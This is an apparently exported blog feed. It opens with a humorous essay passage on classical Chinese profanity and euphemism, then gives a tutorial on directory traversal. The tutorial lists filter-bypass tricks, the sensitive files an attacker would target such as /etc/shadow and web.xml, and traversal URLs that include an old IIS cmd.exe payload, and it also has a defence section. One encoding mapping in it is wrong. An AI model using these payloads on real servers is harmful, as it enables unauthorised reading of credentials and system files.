厚颜无耻之人”，那确实应该好好学习一下了。</p><p>在秦汉时期，你会发现那个时代的人骂人还是很温和的，而且骂人需要一定的知识，因为当时书面语和口语比较接近。例如大家以前都学过的《鸿门宴》，项羽不听范增的劝告，放走了刘邦，急得范增大骂：“唉，竖子不足与谋！”意思就是“不想再跟你这个弱智玩了。”</p><p>当然也有更高级一点的，建安七子陈琳曾写《讨贼檄文》，痛骂曹操祖宗三代，听得曹操一愣一愣，你骂我可以理解，祖宗三代都骂了是什么操作，更骚的是把曹操当时的头风一下子治好了，这不是逆天我随你怎么说。</p><p>贴一波原文，👴甚是喜欢这文采</p><blockquote><p>盖闻明主图危以制变，忠臣虑难以立权。是以有非常之人，然后有非常之事；有非常之事，然后立非常之功。</p><p>夫非常者，固非常人所拟也。曩者，强秦弱主，赵高执柄，专制朝权，威福由己；时人迫胁，莫敢正言；终有望夷之败，祖宗焚灭，污辱至今，永为世鉴。及臻吕后季年，产禄专政，内兼二军，外统梁、赵；擅断万机，决事省禁；下陵上替，海内寒心。</p><p>于是绛侯朱虚兴兵奋怒，诛夷逆暴，尊立太宗，故能王道兴隆，光明显融：此则大臣立权之明表也。司空曹操：祖父中常侍腾，与左悺、徐璜并作妖孽，饕餮放横，伤化虐民；父嵩，乞匄携养，因赃假位，舆金辇璧，输货权门，窃盗鼎司，倾覆重器。操赘阉遗丑，本无懿德，犭票狡锋协，好乱乐祸。</p><p>幕府董统鹰扬，扫除凶逆；续遇董卓，侵官暴国。于是提剑挥鼓，发命东夏，收罗英雄，弃瑕取用；故遂与操同谘合谋，授以裨师，谓其鹰犬之才，爪牙可任。</p><p>至乃愚佻短略，轻进易退，伤夷折衄，数丧师徒；幕府辄复分兵命锐，修完补辑，表行东郡，领兖州刺史，被以虎文，奖戚威柄，冀获秦师一克之报。</p><p>而操遂承资跋扈，恣行凶忒，割剥元元，残贤害善。故九江太守边让，英才俊伟，天下知名；直言正色，论不阿谄；身首被枭悬之诛，妻孥受灰灭之咎。</p><p>自是士林愤痛，民怨弥重；一夫奋臂，举州同声。故躬破于徐方，地夺于吕布；彷徨东裔，蹈据无所。</p><p>幕府惟强干弱枝之义，且不登叛人之党，故复援旌擐甲，席卷起征，金鼓响振，布众奔沮；拯其死亡之患，复其方伯之位：则幕府无德于兖土之民，而有大造于操也。</p><p>后会銮驾返旆，群虏寇攻。时冀州方有北鄙之警，匪遑离局；故使从事中郎徐勋，就发遣操，使缮修郊庙，翊卫幼主。</p><p>操便放志：专行胁迁，当御省禁；卑侮王室，败法乱纪；坐领三台，专制朝政；爵赏由心，弄戮在口；所爱光五宗，所恶灭三族；群谈者受显诛，腹议者蒙隐戮；</p><p>百僚钳口，道路以目；尚书记朝会，公卿充员品而已故太尉杨彪，典历二司，享国极位。操因缘眦睚，被以非罪；榜楚参并，五毒备至；触情任忒，不顾宪纲。又议郎赵彦，忠谏直言，义有可纳，是以圣朝含听，改容加饰。</p><p>操欲迷夺时明，杜绝言路，擅收立杀，不俟报国。</p><p>又梁孝王，先帝母昆，坟陵尊显；桑梓松柏，犹宜肃恭。而操帅将吏士，亲临发掘，破棺裸尸，掠取金宝。至令圣朝流涕，士民伤怀！操又特置发丘中郎将、摸金校尉，所过隳突，无骸不露。</p><p>身处三公之位，而行桀虏之态，污国害民，毒施人鬼！加其细致惨苛，科防互设；罾缴充蹊，坑阱塞路；举手挂网罗，动足触机陷：是以兖、豫有无聊之民，帝都有吁嗟之怨。</p><p>历观载籍，无道之臣，贪残酷烈，于操为甚！幕府方诘外奸，未及整训；加绪含容，冀可弥缝。而操豺狼野心，潜包祸谋，乃欲摧挠栋梁，孤弱汉室，除灭忠正，专为袅雄。</p><p>往者伐鼓北征公孙瓒，强寇桀逆，拒围一年。操因其未破，阴交书命，外助王师，内相掩袭。会其行人发露，瓒亦枭夷，故使锋芒挫缩，厥图不果。今乃屯据敷仓，阻河为固，欲以螳螂之斧，御隆车之隧。</p><p>幕府奉汉威灵，折冲宇宙；长戟百万，胡骑千群；奋中黄育获之士，骋良弓劲弩之势；并州越太行，青州涉济漯；大军泛黄河而角其前，荆州下宛叶而掎其后：雷震虎步，若举炎火以焫飞蓬，覆沧海以沃[火票]炭，有何不灭者哉？</p><p>又操军吏士，其可战者，皆出自幽冀，或故营部曲，咸怨旷思归，流涕北顾。其余兖豫之民，及吕布张杨之余众，覆亡迫胁，权时苟从；各被创夷，人为仇敌。</p><p>若回旆方徂，登高冈而击鼓吹，扬素挥以启降路，必土崩瓦解，不俟血刃。方今汉室陵迟，纲维弛绝；圣朝无一介之辅，股肱无折冲之势。</p><p>方畿之内，简练之臣，皆垂头翼，莫所凭恃；虽有忠义之佐，胁于暴虐之臣，焉能展其节？又操持部曲精兵七百，围守宫阙，外托宿卫，内实拘执。惧其篡逆之萌，因斯而作。此乃忠臣肝脑涂地之秋，烈士立功之会，可不勖哉！</p><p>操又矫命称制，遣使发兵。恐边远州郡，过听给与，违众旅叛，举以丧名，为天下笑，则明哲不取也。即日幽并青冀四州并进。</p><p>书到荆州，便勒现兵，与建忠将军协同声势。州郡各整义兵，罗落境界，举武扬威，并匡社稷：则非常之功于是乎著。</p><p>其得操首者，封五千户侯，赏钱五千万。部曲偏裨将校诸吏降者，勿有所问。广宜恩信，班扬符赏，布告天下，咸使知圣朝有拘迫之难。如律令！</p></blockquote><p>这不是大才子？最骚的还在这里：<code>司空曹操：祖父中常侍腾，与左悺、徐璜并作妖孽，饕餮放横，伤化虐民；父嵩，乞匄携养，因赃假位，舆金辇璧，输货权门，窃盗鼎司，倾覆重器。操赘阉遗丑，本无懿德，犭票狡锋协，好乱乐祸。</code>，直接是从祖宗十八代骂了曹操一家，还骂他爹是太监，曹操倒也宽容大度，后来逮住了陈琳，还笑着对他说：“你的说法就很有问题，要是我爸是太监的话，我是怎么生下来的呢”，也没杀陈琳，让陈琳下去做写文章的人了。</p><p>再到了唐宋元时期，就有了更多可骂的词汇了，经过了秦汉的发展，唐宋元脏话进一步向今天靠拢。举个栗子，《资治通鉴》中记载，安西节度使夫蒙灵察大骂高仙芝：“啖狗粪高丽奴！”（吃狗屎吧高丽棒子（食屎啦你，吔屎啦梁非凡）），混杂了当时的各种流行技巧，如民族歧视、人格鄙视、动物类比等，代表了唐朝骂人的上等水平。</p><p>被誉为千古一帝的唐宗宋祖，脏话也照说不误，唐太宗曾被魏征的进谏惹怒，跑回去跟老婆哭诉：“会需杀此田舍翁！”（总有一天要杀了这个乡巴佬）。宋太祖寝室房梁损坏，需要更换，大臣奏报要截根巨木当房梁，太祖在折子上批：“截你爷头，截你娘头。”（截你爸的头，截你妈的头），当时的人不禁纷纷称赞，认为充分表现了太祖的爱物之心。</p><p>而想要了解宋元的民间脏话，当然不得不看国骂宝典《水浒传》，以骂街达人鲁智深为例，说话几乎没有不带脏字的：“直娘贼！还敢应口”，“你两个撮鸟”，“这厮们挟着屁眼撒开”。白话中夹带着文言，粗俗中透露一丝文趣（误），完美表现了花和尚豁达直爽的性格，让人听了畅快淋漓（大误）。</p><p>这会儿到了明清时期，恭喜你，可能之前你觉得，贼、这厮、腌臜等，仍然不够劲爆，那么明清则进一步地，将脏话集中到下半身，以及下半身的动作，与今天非常接近，太尼娘带劲辣。不过《大明律》和《大清律》中规定，骂人是犯罪行为，轻者打屁股、重者流放，所以骂人有一定风险。连文人叫骂也粗俗了许多，比如明朝文豪王世贞，贵为“后七子”之首，在diss别人的诗词时，也使用了粗鄙之语：“此等语，何不以溺自照？”，用今天的话说就是：“你写的是什么鬼，怎么不撒泡尿照照自己？”。号称封建社会百科全书的《红楼梦》，里面的骂人艺术甚至完爆了现代，比如第四十六回，鸳鸯骂嫂子：“你快夹着屄嘴离了这里，好多着呢！什么‘好话’！宋徽宗的鹰，赵子昂的马，都是好画（话）儿。什么‘喜事’！状元痘儿灌的浆儿又满是喜事！怪道成日家羡慕人家女儿做了小老婆了，一家子都仗着他横行霸道的，一家子都成了小老婆了！看的眼热了，也把我送在火坑里去。”，盛怒之下，不仅出口成脏，还不忘用典，前半句一语双关，后半句谐音用典，还是出自一位娇滴滴，尚未出嫁的小姐姐之口。（贾赦看上了贾母跟前的贴身丫环鸳鸯，贪恋美色的贾赦先派邢夫人前去传话，没什么进展，于是后来又叫鸳鸯的嫂嫂说亲，一心想攀龙附凤向上爬的嫂嫂不仅没有做好媒，本想着一飞冲天，结果呢，人生不如意之事十之八九，性格刚烈的鸳鸯直接给不知天高地厚的嫂嫂一顿好骂！闹的她灰头土脸的。）</p><p>一般而言，脏话不外乎这几个方面，性、动物、恶心、地位、人格、血统，所以脏话想令人耳目一新，必须多面结合，层层递进。比如《水浒传》王婆骂郓哥：“含鸟猢狲！”又如《金瓶梅》吴月娘痛骂bitch：“贼狗攮的养汉的淫妇！”都是很好的成功案例。</p><p>相信看到这里，大家对古代脏话，以及骂人的高级技巧，已经有了一定理解，不妨试做例题：</p><hr><p>如何说一句，惊天地泣鬼神的脏话？</p><p>参考答案：</p><p>明末清初长篇小说《醒世姻缘传》第十一回：“放你家那臭私窠子淫妇歪拉骨接万人的大开门驴子狗臭屁！”</p><hr><p>再然后呢，就是现代辣，现代呢</p><p><img src="https://i.loli.net/2021/04/25/qxDQHdNh3Xtu1jV.jpg"></p><p><del>彳亍，这一次就谈这么多了，下次谈谈我正好想谈的，虽然暂时还不知道想谈啥，但是这玩意儿可比课设有意思多了</del></p><h1 id="0x02-Chinese的委婉艺术"><a href="#0x02-Chinese的委婉艺术" class="headerlink" title="0x02 Chinese的委婉艺术"></a>0x02 Chinese的委婉艺术</h1><p><strong>“你是个好人”</strong>，<strong>“我们还是做朋友吧”</strong>，<strong>“我们不太合适，你会遇到更好的”</strong>，不知道在座的hxd有多少人听过这些话，确实大家都是明白人，这么一说也就明白了，欸，凉了，黄了黄了，找下一个吧，xsl，但是总好过被直接挑明是不是，“我对你没有感觉”，“爬，👵不喜欢你个脑瘫”，“我以为你只是我朋友而已，我其实也不喜欢你”，对不对，内容太过扎心，引起极度不适。</p><p>再说点真实的，你和你的女神聊着聊着，你女神突然来了一句：“👵洗澡去了”，然后你期待地坐在桌前拿着手机痴笑，等了个三个小时，室友们都睡着好久了，鼾声在寝室里回荡着，天地间彷佛只存在你个撒比，甚至你可能还在幻想着女神洗完了澡给你打个视频电话过来，然后问你她好不好看（“扑哧”，来自屏幕另一端的无情嗤笑）</p><p>那这哥们确实也是不懂味嗷，如果想和你聊的话或者说觉得和你聊天有意思，人家肯定第一时间就来找你了，是不是，你总不希望听到“👵不想和你个矬逼屌丝聊了，👵要去找👵喜欢的👴了，爬吧”这样的话吧，那也太没味了，而且别人也肯定不愿意去挑明这种玩意，多没意思，自己心里有B数就好辣。</p><p>生活中有许多事情是只需意会，不必言传的，古人也曾说过“言有尽而意无穷，余意尽在不方中”，讲个笑话：</p><blockquote><p>从前，有个酒店老板，脾气非常暴躁。一天，有个客人来喝酒，才喝了一口，嘴里便叫：“好酸！好酸！”老板听后大怒，不由分说，把客人绑起来，吊在屋梁上。这时来了另一位顾客，问老板为什么吊人，老板回答：“我店的酒明明香醇甜美，这家伙硬说是酸的，你说该不该吊人？”来客说：“可不可让我尝尝？”老板殷勤地给他端了一杯酒，客人呷了一口，酸得皱眉眯眼，对老板说：“你放下这个人，把我吊起来吧？”这位客人委婉含蓄的说法，既收到强烈的讽刺效果，又显得非常艺术。</p></blockquote><p>“予谓菊，花之隐逸者也”，只一句，北宋周敦颐就将菊花等同于古代隐士。不食人间烟火，高冷范儿，妥妥的，全是菊花好。而今，新新人类利用他们庞大的脑洞，将这些词汇的含义进行了引申。“留图不留种，菊花万人捅”。👴踏马笑得菊花都松了……从此，世风日下，菊花不在。再回首，读到“菊之爱，陶后鲜有闻。”，当时便虎躯一震，似乎明白了什么。（误）</p><p>《口技》，又是大家都学过的：“遥闻深巷犬吠声，便有妇人惊觉欠伸，摇其夫语猥亵事。夫呓语，初不甚应，妇摇之不止，则二人语渐间杂，床又从中戛戛。”，从中戛戛，哈哈哈！</p><p>再来谈点奇♂怪的东西吧，老祖宗造字有个规矩，简单粗暴。简单怎么说呢？会意法造字，让人一目了然，比如“休”，人靠树所谓休息；再比如“囚”，人困于口所谓囚；又像“尖”，上小下大为尖，都很生动形象。粗暴呢，我们可以看一看这个字——“肏”（cao），上入，下🥩，含义就是进入到肉里面去，仅从字形就暴露出 sexual intercourse 的本质，《红楼梦》中有个经典桥段：“只见炕上那人笑道：‘瑞大叔要肏我呢！’”。当然呢，还有“挊”（nong），用手上下摩擦某根玩意，仔细想想这不就是撸嘛，其实它本来的意思也正是男性自我安慰。</p><p>这俩字挺逆天的，达到了会意的最高境界，所以它们也被屏蔽掉了，不过呢，尽管失去了这俩字，我们还发明了“艹”“操”“撸”“干”“弄”“日”“插”等字词，它们也成功地取代了前者，成为了它们的委婉用法，不过第一次看见“肏”和“挊”，应该多半是一脸懵逼的，实际上我们会更加乐意使用后者，“X你祖宗！”。</p><p>原因其实很简单，毕竟“肏”和“挊”两个字太过于形象生动，反而提不起中国人的兴趣，因为越是形象生动的字词，越是没有联想空间；越没有联想空间，就越不骚气与浪漫。比如北方俗语的“干天，操地，日太阳”，默念三遍，幻肢已硬！若变成了“肏天，肏地，肏太阳”，大哥能不能换个词？！表达太单调啊。</p><p>而且“肏”，“挊”两字太过赤裸，从风花雪月到真枪实干的这一步骤，如若你用这俩词，233333是不是怪怪的，或许这就是委婉的魅力吧，越是无限委婉，越是显得污力滔滔，传进千家万户……当然，普通的委婉语并不能让你成为把妹高手。满嘴“菊花”“黄瓜”“木耳”只会让你更加猥琐。</p><p>具有高级感的委婉语可遇不可求，这个要像老祖宗学习。首先要会做梦，梦感要极强！最好能令人浮想联翩。战国时宋玉的《高唐赋》有言：</p><hr><p>昔者先王梦见一妇人曰：妾，巫山之女也，愿荐枕席。</p><p>先王问：你干嘛的？我可不是随便的人</p><p>妇人答：妾旦为朝云，暮为行雨。</p><hr><p>于是先王睡了一个晨变云朵，晚变烟雨的女子。他们睡的过程就被大家粗暴地认为是“巫山云雨”。“巫山”“云雨”两个词贴切啊！巫山云雨是床笫之欢。曹雪芹在《红楼梦》第六回“宝玉初试云雨情”中写的就是贾宝玉与丫环袭人房事之时的情景，但此处贾宝玉携袭人行房事有没有那啥那啥那啥那啥那啥快乐咱们就不得而知了。</p><p>其次要会联想，颠鸾倒凤，鸾是神鸟，凤就是凤凰。颠鸾倒凤的本意比喻颠倒次序。如果将颠鸾倒凤用于人身上，就有了男女交欢之意。元代王实甫《西厢记》第四本第二折中有：“你绣帷里效绸缪，颠鸾倒凤百事有”的记载，《红楼梦》第六十五回也有“是夜，贾琏和他颠鸾倒凤，百般恩爱”。姿势很丰富嘛。用现在的话来说，就是6️⃣9️⃣。一提6️⃣9️⃣，老司机会心一笑，颠鸾倒凤就显得更加耐人寻味。</p><p>说到内涵，元朝王实甫在《西厢记》中的另外一个词语——鱼水之欢更加有内涵。鱼和水的故事最早出自于名著《三国演义》中，刘备对诸葛亮的评语就是：吾得孔明，犹鱼之得水也。形容融洽的合作伴侣的关系。当合作伴侣变为男人和女人的时候，“如鱼得水”也就演变成为了“鱼水之欢”。这类词还有很多，“于飞之愿”“云朝雨暮”“管鲍之交”……（用的开心，才是真的好~）</p><p>你喜欢“make love”，👴喜欢“朝云暮雨”，你喜欢“约吗？”，👴喜欢“花明月暗笼轻雾，今宵好向郎边去”。中文的博大精深在委婉这里也真是体现得淋漓尽致，比起一丝不挂，我们更喜欢浴霸还休（bushi</p><p>说来，你去医院可以直接用“菊花”这个词汇来表达，医生都能够分分钟理解你的含义。不过，别指望这个词汇会出现在你的病历上，医生可没有你那么幽默。说到医院和医生，我们再来聊聊别的，刚才似乎开🚗开过头了，咳咳。</p><p>“对不起，我们已经尽力了“，这是大夫们在抢救不回来病人的时候最常用的一句，男主绝望地看着抢救室暗下去的💡，无力地瘫倒在了ICU外的凳子上，脑海里开始跑马灯，回忆起来他和他最爱的女友……养的小狗度过的那些幸福瞬间……</p><p>不扯远了，我们继续回到话题，虽然说生老病死是人间常态，但是对于死这个字，人们还是很有忌讳的，从古至今，人们都在寻找可以替代死字的词汇或者是说法，比如：</p><hr><p>亡、故、卒、弱、逝、殁、殪、毙、殂、徂、殒、薨、死亡、丧亡、亡故、身故、物故、物化、去世、逝世、弃世、过世、下世、就世、谢世、凋谢、死灭、毙命、毕命、殒命、殒灭、捐背、捐馆、殂落、徂落、殂谢、徂谢、迁化、怛化、疾终、长逝、永诀、永别、永眠、长眠、就木、故去、溘逝、溘死、断气、咽气、合眼、闭眼、没了、挺腿、完蛋、呜呼、回老家、玩儿完、翘辫子、上西天、见阎王、登鬼录、填沟壑、粉身碎骨、见马克思、与世长辞、溘然长逝、寿终正寝、命赴黄泉、呜呼哀哉、一命呜呼、天夺其魄、仙逝、仙游、千古、作古、归西、归天、大故、不在、过去、不禄、不讳、不可讳、跨鹤西游、千秋之后、百年之合、三长两短、山高水低、见背、弃养、牺牲、舍身、献身、就义、捐躯、捐生、殉职、殉国、殉难、殉节、殉、效死、效命、授命、阵亡、成仁、杀身成仁、舍生取义、以身许国、马革裹尸、肝脑（胆）涂地、横死、强死、凶死、丧命、送命、毙命、暴卒、倒头、死于非命、饿死、殣、升天、涅盘、坐化、羽化、鹤化、物化、圆寂、归寂、示寂、入寂、入灭、灭度、示灭、尸解、崩、驾崩、山陵崩、晏驾、升遐、登遐、宾天、大行、千秋万岁、夭折、夭亡、短折、早世、早逝、早死、中殇、殇、兰摧玉折、玉楼赴召、玉楼修记、地下修文、葬玉埋香、玉殒香消、香消玉殒、借女离魂、客死、瘐死</p><hr><p>这么一列，愈发感觉人们为了避讳能有多强的创造能力。</p><p>学习之余随便侃侃这些感觉巨鸡儿👍，放松心情，令人神清气爽，好像鸽了<code>不带脏字的骂人说法</code>两回了，下次继续🕊，溜</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈目录穿越</title>
      <link href="2021/04/25/%E6%B5%85%E8%B0%88%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"/>
      <url>2021/04/25/%E6%B5%85%E8%B0%88%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>目录遍历（目录穿越）是一个Web安全漏洞，攻击者可以利用该漏洞读取运行应用程序的服务器上的任意文件。 这可能包括应用程序代码和数据，后端系统的登录信息以及敏感的操作系统文件</p><p>在某些情况下，攻击者可能能够在服务器上写入任意文件，（如，FFFTP 是一款小型的 FTP 客户端软件。FFFTP客户端没有正确地验证 FTP 服务器所返回的 LIST 命令响应中包含有目录遍历序列（斜线）的文件名，如果用户受骗从恶意的 FTP 服务器下载的目录包含有带有恶意文件名的文件的话，就可能导致向用户系统的任意位置写入文件）从而允许他们修改应用程序数据或行为，并最终完全控制服务器</p><h1 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h1><h2 id="0x00-基础目录遍历"><a href="#0x00-基础目录遍历" class="headerlink" title="0x00 基础目录遍历"></a>0x00 基础目录遍历</h2><p>直接利用 ../ 返回上一级来遍历任意文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="0x01-绝对路径"><a href="#0x01-绝对路径" class="headerlink" title="0x01 绝对路径"></a>0x01 绝对路径</h2><p>web网站有时候会采取目录遍历的防御措施，如过滤 ../ 上一级等关键字，然后简单的过滤通常会被绕过。有时候可以直接采用绝对路径，无须 ../ 返回上一级目录遍历</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="0x02-双写-绕过"><a href="#0x02-双写-绕过" class="headerlink" title="0x02 双写../绕过"></a>0x02 双写../绕过</h2><p>有时候，防御措施是直接将 ../ 替换为空，可以直接采用双写直接绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="0x03-URL编码绕过"><a href="#0x03-URL编码绕过" class="headerlink" title="0x03 URL编码绕过"></a>0x03 URL编码绕过</h2><p>也可以采用 URL 编码来绕过服务器对 . 或者 / 的检测</p><blockquote><p>.  =&gt; %2c</p><p>/  =&gt; %2f</p><p>% =&gt; %25 (双重URL编码)</p></blockquote><h2 id="0x04-绝对路径配合"><a href="#0x04-绝对路径配合" class="headerlink" title="0x04 绝对路径配合 ../"></a>0x04 绝对路径配合 ../</h2><p>有些 web 在获取文件时，会首先判断是否以一个固定的路径开头</p><p>那么就可以配合 ../ 来返回上一级遍历任意文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;images&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="0x05-截断文件后缀"><a href="#0x05-截断文件后缀" class="headerlink" title="0x05 截断文件后缀"></a>0x05 截断文件后缀</h2><p>某些 web 对文件类型作了限制，只有当后缀为图片时才解析</p><p>这时候就可以利用 %00 来截断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00.jpg</span><br></pre></td></tr></table></figure><h2 id="0x0x"><a href="#0x0x" class="headerlink" title="0x0x"></a>0x0x</h2><p>要读取根目录下的文件的话 ../ 可以随意拼接任意个，就像 ../../../../../../../../../../../../../../../../../../../../../../</p><p>因为到了根目录再返回上级目录依然是根目录</p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>防止文件路径遍历漏洞的最有效方法是避免将用户提供的输入完全传递给文件系统API</p><p>如果认为不可避免的是将用户提供的输入传递给文件系统 API，则应同时使用两层防御，以防止受到攻击：</p><blockquote><ul><li>应用程序应在处理之前验证用户输入。理想情况下，验证应与允许值的白名单进行比较。如果所需的功能无法做到这一点，则验证应验证输入内容仅包含允许的内容，例如纯字母数字字符</li><li>验证提供的输入后，应用程序应将输入附加到基本目录，并使用平台文件系统 API 规范化路径。验证规范化路径以预期的基本目录开头</li></ul></blockquote><h1 id="攻击路径整理"><a href="#攻击路径整理" class="headerlink" title="攻击路径整理"></a>攻击路径整理</h1><h2 id="文件整理"><a href="#文件整理" class="headerlink" title="文件整理"></a>文件整理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\drivers\etc\hosts #Win10</span><br><span class="line">C:\boot.int  #Win7 隐藏文件</span><br><span class="line">web.xml  #Java Web项目配置文件  </span><br><span class="line">&#x2F;WEB-INF&#x2F;web.xml</span><br><span class="line">C:\Program Files\mysql\my.ini  #Mysql下配置文件</span><br><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;hosts</span><br><span class="line">&#x2F;etc&#x2F;group</span><br><span class="line">&#x2F;etc&#x2F;shadow</span><br><span class="line">&#x2F;.htaccess</span><br><span class="line">&#x2F;phpinfo.php</span><br><span class="line">&#x2F;inc&#x2F;db.php</span><br><span class="line">&#x2F;inc&#x2F;conn.php</span><br><span class="line">&#x2F;Windows&#x2F;system.ini</span><br><span class="line"></span><br><span class="line"># Tomcat</span><br><span class="line">&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line"># Windows + IIS + asp</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;scripts&#x2F;..%5c..&#x2F;Windows&#x2F;System32&#x2F;cmd.exe?&#x2F;c+dir+c:\  # 老版本 - IIS CGI文件名解码漏洞</span><br><span class="line">http:&#x2F;&#x2F;test.com&#x2F;show.asp?view&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;Windows&#x2F;system.ini</span><br></pre></td></tr></table></figure><h2 id="路径整理"><a href="#路径整理" class="headerlink" title="路径整理"></a>路径整理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;en&#x2F;..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth1</span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">....&#x2F;&#x2F;....&#x2F;&#x2F;static&#x2F;xx.php%00.png</span><br><span class="line"></span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;web.xml</span><br><span class="line"></span><br><span class="line">C:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line">C:\inetpub\wwwroot\global.asa</span><br><span class="line">C:&#x2F;boot.ini</span><br><span class="line">C:\boot.ini</span><br><span class="line">D:\inetpub\wwwroot\global.asa</span><br><span class="line">D:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line"></span><br><span class="line">xx.php?vt&#x3D;&amp;cate&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;doc&#x2F;index?md&#x3D;diagnose_api&amp;app&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;en&#x2F;..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth1</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;pcheck&#x2F;index.php?action&#x3D;showPcheck&amp;report&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;xx&#x2F;img.php?s&#x3D;16,40&amp;n&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;static&#x2F;xx.php%00.png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line">C:\inetpub\wwwroot\global.asa</span><br><span class="line">C:&#x2F;boot.ini</span><br><span class="line">C:\boot.ini</span><br><span class="line">D:\inetpub\wwwroot\global.asa</span><br><span class="line">D:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;2xx.xx.xx.xx:8080&#x2F;xampp&#x2F;showcode.php&#x2F;c:xampp&#x2F;htdocs&#x2F;xampp&#x2F;showcode.php?showcode&#x3D;1</span><br><span 